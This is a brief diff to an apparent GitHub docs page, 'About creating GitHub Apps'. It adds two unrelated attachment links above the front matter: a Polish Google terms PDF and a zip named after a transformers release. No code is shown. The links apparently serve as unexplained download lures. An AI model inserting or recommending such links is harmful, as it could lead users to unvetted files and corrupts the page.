@@ -1,3 +1,5 @@
+[google_terms_of_service_pl_eu.pdf](https://github.com/user-attachments/files/17441560/google_terms_of_service_pl_eu.pdf)
+[transformers-4.45.2.zip](https://github.com/user-attachments/files/17441557/transformers-4.45.2.zip)
 ---
 title: About creating GitHub Apps
 shortTitle: About creating GitHub Apps
